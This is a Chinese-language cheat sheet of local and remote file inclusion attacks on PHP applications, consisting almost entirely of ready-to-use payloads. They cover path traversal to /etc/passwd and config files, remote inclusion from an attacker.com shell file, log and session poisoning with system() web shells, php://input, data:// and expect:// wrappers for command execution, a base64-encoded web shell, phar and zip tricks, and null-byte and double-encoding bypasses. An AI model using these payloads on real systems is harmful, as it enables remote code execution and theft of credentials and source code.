# LFI详细分类

## 1. 本地文件包含 (LFI)

```
?page=../../../../etc/passwd
?page=/etc/passwd
?page=....//....//....//etc/passwd
```

---

## 2. 远程文件包含 (RFI)

```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.txt
```

---

## 3. 日志投毒

### Apache日志

```
访问: <?php system($_GET['cmd']);?>
?page=/var/log/apache2/access.log&cmd=whoami
?page=/var/log/apache2/error.log
```

### SSH日志

```
ssh "<?php system('id');?>"@target.com
?page=/var/log/auth.log&cmd=id
```

### Nginx日志

```
?page=/var/log/nginx/access.log
?page=/var/log/nginx/error.log
```

---

## 4. 伪协议利用

### PHP://input

```
?page=php://input
POST: <?php system('id'); ?>
```

### PHP://filter

```
?page=php://filter/read=convert.base64-encode/resource=config.php
?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

### data://

```
?page=data://text/plain,<?php system('id');?>
?page=data:text/plain,<?php system('id');?>
```

### expect://

```
?page=expect://id
?page=expect://whoami
```

---

## 5. 目录遍历

```
?page=....//....//....//etc/passwd
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

## 6. PHP Filter链

### 读取文件

```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=convert.base64-encode/resource=index.php
```

### 编码转换

```
?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php
```

---

## 7. PHP Input

```
?page=php://input
POST: <?php system($_GET['c']); ?>&c=whoami
```

---

## 8. PHP Data

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

---

## 9. PHP Zip

```
?page=zip://shell.jpg#shell.php
?page=phar://shell.jpg/shell.php
```

---

## 10. Phar反序列化

```
?page=phar://upload/shell.jpg/shell.php
?page=phar://../../../var/www/html/uploads/shell.jpg/shell
```

---

## 11. Session文件包含

### 默认路径

```
/tmp/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/var/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

### 利用

```
1. 登录并设置username为恶意代码
2. 包含session文件
?page=/tmp/sess_xxxxx&cmd=whoami
```

---

## 12. Proc文件系统

```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/self/fd/1
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/unix
```

---

## 13. 绕过技术

### 空字节截断

```
?page=shell.php%00.jpg
?page=shell.php\0.jpg
```

### 双编码

```
?page=..%252f..%252f..%252fetc%252fpasswd
```

### 协议叠加

```
?page=php://filter/convert.base64-encode/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
